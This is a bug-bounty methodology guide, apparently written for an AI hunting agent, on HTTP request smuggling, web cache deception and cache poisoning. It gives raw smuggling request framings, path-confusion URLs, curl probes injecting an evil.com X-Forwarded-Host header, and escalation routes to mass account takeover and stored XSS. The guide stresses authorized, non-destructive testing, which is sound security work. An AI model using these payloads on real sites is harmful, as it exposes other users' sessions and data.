# HTTP Desync / Request Smuggling + Web Cache Deception & Poisoning

> Two families of **front-end ↔ back-end discrepancy** bugs — the CDN/proxy and the origin disagree about *where a request ends* (desync) or *what is cacheable / whose data it holds* (cache). Both are unauth, both hit **every user of the site**, both are 2024–2025's highest-paying web classes ($350K+ across two weeks of desync; $100K+ cache). Ceiling: mass ATO with zero interaction.

**Safety first (non-negotiable):** these attacks can poison responses for *real users*. Test only in scope, use **non-destructive probes** that only change YOUR connection, detect via status/header/timing deltas — never inject a payload that a third party could receive. Use a dedicated test path, back off instantly on anomalies, and never poison a shared cache on prod without explicit permission.

---

## PART A — HTTP Desync / Request Smuggling (2025 "endgame")

Front-end and back-end parse HTTP/1.1 request boundaries differently → attacker bytes get prepended to the *next* visitor's request. James Kettle's 2025 work (`http1mustdie.com`) showed this still compromises tens of millions of sites; CVE-2025-32094 (Akamai), CVE-2025-4366, plus Cloudflare/Netlify/IIS/nginx/AWS-ALB classes.

### Variants + probe structures (send with `\r\n`, exact framing matters)

**Expect-based desync (easiest 2025 win, often bypasses WAF):**
```http
GET /logout HTTP/1.1
Host: TARGET
Expect: 100-continue
Content-Length: 291

<smuggled request bytes...>
```
Obfuscated (defeats naive `Expect` filters):
```http
GET / HTTP/1.1
Host: TARGET
Expect: y 100-continue
Content-Length: 292
```

**0.CL desync** — back-end sees a `Content-Length`, front-end sees `0`. Needs an *early-response gadget* (a path that responds before reading the body — Windows reserved names `/con`, `/nul`, redirects, or an error route):
```http
GET /con HTTP/1.1
Host: TARGET
Content-Length: 7

GET / HTTP/1.1
Host: TARGET
```

**CL.0 desync** — front-end ignores `Content-Length`, back-end honours it (common on static-file/`.css`/`.js` paths):
```http
GET /style.css HTTP/1.1
Host: TARGET
Foo: bar
Content-Length: 23

GET /404 HTTP/1.1
X: y
```

**H2.0 / HTTP/2 downgrade** — front-end speaks h2, downgrades to a back-end h1 that mis-frames (Cloudflare-class, 24M+ sites). Test h2→h1 with an oversized/duplicated CL after downgrade.

Also classic: **CL.TE** / **TE.CL** (one server uses `Content-Length`, the other `Transfer-Encoding: chunked`) with obfuscated `Transfer-Encoding` (`Transfer-Encoding : chunked`, `\tchunked`, `chunked\r\nTransfer-Encoding: x`).

### Detection methodology (safe)
1. **Tool:** Burp **HTTP Request Smuggler v3.0** — automated parser-discrepancy detection, V-H / H-V classification, `0cl-find-offset` Turbo Intruder script. Confirm manually.
2. **Timing probe:** a smuggled request that forces the back-end to wait for bytes that never arrive → **your** next request hangs (timeout delta) without touching other users.
3. **Discrepancy probe:** send a masked header visible to one hop but not the other; compare status codes across variations.
4. **Confirm safely** on a self-owned session first (your own two sequential requests) before ever risking a shared socket.

### Impact
- **Response Queue Poisoning (RQP):** back-end's response pipeline desyncs → you receive **other users' responses** (GitLab: another user's private report; Netlify: a stream of every site's responses). Unauth mass data leak + session/token capture → **ATO at scale**.
- **Request routing / cache poisoning:** redirect arbitrary visitors to attacker domain (Cloudflare case).
- **Bypass front-end controls:** smuggle to internal-only paths the WAF/edge blocks.

### Report lead
`[Pre-auth] HTTP request smuggling (<0.CL|CL.0|Expect|H2.0>) on <host> via <front-end>/<back-end> → response queue poisoning captures other users' authenticated responses → mass ATO.` Prove with a timing/discrepancy delta + one captured (redacted) cross-user response on a self-triggered request.

---

## PART B — Web Cache Deception (WCD)

Trick the cache into storing an **authenticated, per-user** response under a URL the attacker can then fetch → read the victim's data (auth token, PII, session). The ChatGPT ATO used exactly this.

### Root cause
CDN and origin **normalize paths differently**. CDN sees a "static-looking" prefix/suffix and caches; origin routes it to a dynamic sensitive endpoint.

### Techniques (try in order)
```
# 1. Static-extension append (classic) — origin ignores extra path, CDN caches by ext
https://T/account/settings/nonexistent.css
https://T/api/user;.js        https://T/api/user%0a.css    https://T/api/user?x=1.js

# 2. Delimiter / path-parameter confusion
https://T/account/info;foo.css    https://T/account/info%3bfoo.js    https://T/account/info#.css

# 3. Wildcard / traversal parser confusion (ChatGPT-ATO class) —
#    CDN caches by a cacheable prefix, origin decodes %2F..%2F back to a sensitive path
https://T/share/%2F..%2Fapi/auth/session?cachebuster=123
https://T/assets/..%2f..%2fapi/me?cb=1     https://T/static/%2e%2e/account?cb=1
```

### Detection
1. Find a **cacheable prefix**: request `https://T/<cacheable-prefix>/random-does-not-exist` → look for `Cf-Cache-Status: HIT` / `Age:` / `X-Cache: HIT` / `CF-Cache-Status`. If a *non-existent* path under it caches, the rule is dangerously broad.
2. Find a **sensitive authenticated endpoint** (`/api/auth/session`, `/api/me`, `/account`, `/api/user`) that returns per-user data.
3. Craft a URL that the CDN caches (looks static) but the origin routes to the sensitive endpoint (via the techniques above), add a unique `?cachebuster` so you cache a *fresh* victim response.
4. **PoC:** in your authed browser, hit the crafted URL (victim step); from an unauthed/attacker context hit the *same* URL → if you get the authed data, the cache leaked it. Confirm with two separate sessions.

### Impact
Cached per-user auth token / session / PII, retrievable by any attacker with the URL → **ATO / mass PII**. Wildcard-WCD can hit many endpoints at once.

---

## PART C — Web Cache Poisoning

Get a malicious response cached and served to **every** visitor via an **unkeyed input** (a header/param the cache ignores when keying but the origin reflects).

### Hunt
```bash
# Param Miner (Burp) finds unkeyed headers automatically. Manual signal:
curl -s https://T/ -H 'X-Forwarded-Host: evil.com'   | grep -i evil.com   # reflected?
curl -s https://T/ -H 'X-Forwarded-Scheme: http'                          # cache-key exclusion?
curl -s https://T/?cb=1 -H 'X-Forwarded-Host: evil.com'                    # then re-request without header
```
Classic unkeyed inputs: `X-Forwarded-Host`, `X-Forwarded-Scheme`, `X-Host`, `X-Forwarded-For`, `X-Original-URL`, `X-HTTP-Method-Override`, oversized/duplicate headers, `Origin`.

### Escalation
Reflected unkeyed `X-Forwarded-Host` → poison `<script src>`/redirect/OpenGraph → **stored XSS / open redirect served to all users**. Cache-key normalization bugs → cache **deception** (Part B). "Fat GET" (body on GET) + cache = another discrepancy vector. Chain to full site takeover.

### Report lead
`[Pre-auth] Web cache poisoning via unkeyed <header> on <path> — malicious <XSS/redirect> cached and served to every visitor.` Prove: show the poisoned response served on a clean request (no attacker header), then flush politely.

---

## Tooling
```
Burp: HTTP Request Smuggler v3.0, Param Miner, Turbo Intruder, Web Cache Deception scanner
smuggler.py (defparam) · h2csmuggler · echteeteepee (CVE-2025-32094 tester/nuclei)
nuclei -t http/misconfiguration/ (cache) ; manual is the discovery method here
```

## When to route
Deep SPA/JS to find cacheable endpoints & unkeyed params first → `js-recon-agent`. XSS payload crafting for a poisoning chain → `xss-hunter-agent`. Otherwise stay here: these are pure unauth, front-end/back-end discrepancy P1s.
